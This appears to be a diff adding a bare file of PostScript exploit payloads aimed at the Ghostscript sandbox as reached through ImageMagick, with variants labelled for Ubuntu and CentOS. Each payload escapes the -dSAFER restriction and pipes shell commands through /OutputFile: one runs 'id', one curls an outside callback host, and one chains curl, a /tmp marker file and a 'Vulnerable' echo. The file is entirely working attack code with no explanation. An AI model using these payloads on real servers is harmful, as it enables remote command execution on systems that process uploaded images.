@@ -1,0 +1,26 @@
+
+For Ubuntu
+---
+    %!PS
+    userdict /setpagedevice undef
+    save
+    legal
+    { null restore } stopped { pop } if
+    { legal } stopped { pop } if
+    restore
+    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+
+For CentOS
+---
+    %!PS
+    userdict /setpagedevice undef
+    legal
+    { null restore } stopped { pop } if
+    legal
+    mark /OutputFile (%pipe%curl http://xx.example.info/xxx?123) currentdevice putdeviceprops
+    
+    
+Execute Multi Command
+---
+(%pipe%curl --connect-timeout 1 -s http://127.0.0.1/imagemagick/ > /dev/null;touch /tmp/imagemagick20180822; echo "\n\n\nVulnerable\n\n\n")
+
